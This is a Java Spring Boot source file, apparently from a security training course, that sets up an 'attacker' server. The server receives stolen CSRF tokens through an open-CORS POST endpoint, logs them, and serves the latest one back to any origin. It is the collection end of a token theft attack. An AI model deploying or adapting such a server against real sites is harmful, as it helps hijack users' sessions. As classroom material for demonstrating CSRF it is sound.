package victor.training.spring;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@SpringBootApplication
@RestController
public class AttackerApp {
  private static final Logger log = LoggerFactory.getLogger(AttackerApp.class);

  public static void main(String[] args) {
    SpringApplication.run(AttackerApp.class, args);
  }

  private CapturedCsrf lastCapturedCsrf;
  public record CapturedCsrf(String host, String token) {}
  @PostMapping("csrf/capture")
  public void captureCsrf(@RequestBody CapturedCsrf capturedCsrf) {
    log.info("Got {}", capturedCsrf);
    lastCapturedCsrf = capturedCsrf;
  }

  @GetMapping("csrf/last")
  @CrossOrigin(originPatterns = "*")
  public CapturedCsrf getLastCapturedCsrf() {
    return lastCapturedCsrf;
  }

  @Configuration
  public static class WebConfiguration implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
      registry.addMapping("/**").allowedMethods("*");
    }
  }
}
